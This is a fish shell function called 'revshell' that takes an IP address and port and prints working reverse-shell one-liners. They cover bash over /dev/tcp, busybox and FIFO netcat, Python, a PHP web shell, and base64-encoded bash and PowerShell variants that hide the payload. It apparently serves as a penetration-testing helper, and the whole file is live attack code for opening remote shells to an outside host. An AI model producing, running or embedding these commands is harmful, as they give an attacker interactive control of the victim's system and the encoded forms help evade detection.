function revshell --description 'Print reverse-shell one-liners (bash/python/php/nc/powershell base64)'
    if test (count $argv) -lt 2
        echo "Usage: revshell <ip> <port>"
        return 1
    end

    set -l ip $argv[1]
    set -l port $argv[2]

    # Bash one-liner + base64 (single line)
    set -l bash_shell "/usr/bin/bash  -i  >&  /dev/tcp/$ip/$port  0>&1  "
    set -l shell_encode (printf "%s" "$bash_shell" | base64 | string replace -a \n "")

    # PowerShell TCP reverse shell (then encode as UTF-16LE Base64)
    set -l ps_cmd "\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$buffer=0..1024|%{0};while((\$i=\$stream.Read(\$buffer,0,\$buffer.Length)) -ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$buffer,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    set -l ps_base64 (printf "%s" "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 | string replace -a \n "")

    echo
    echo "[+] busybox: busybox nc $ip $port -e sh"
    echo "[+] Java Runtime().exec: bash -c $bash_shell"
    echo "[+] Bash: $bash_shell"
    echo "[+] Bash Encoded: echo '$shell_encode' | base64 -d | /usr/bin/bash"
    echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    echo "[+] PHP simple Revshell: <?php echo system(\"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196\"); ?>"
    echo "[+] Netcat FIFO: rm /tmp/wk; mkfifo /tmp/wk; cat /tmp/wk | /bin/bash -i 2>&1 | nc $ip $port"
    echo "[+] PowerShell (Base64): powershell -e $ps_base64"
end
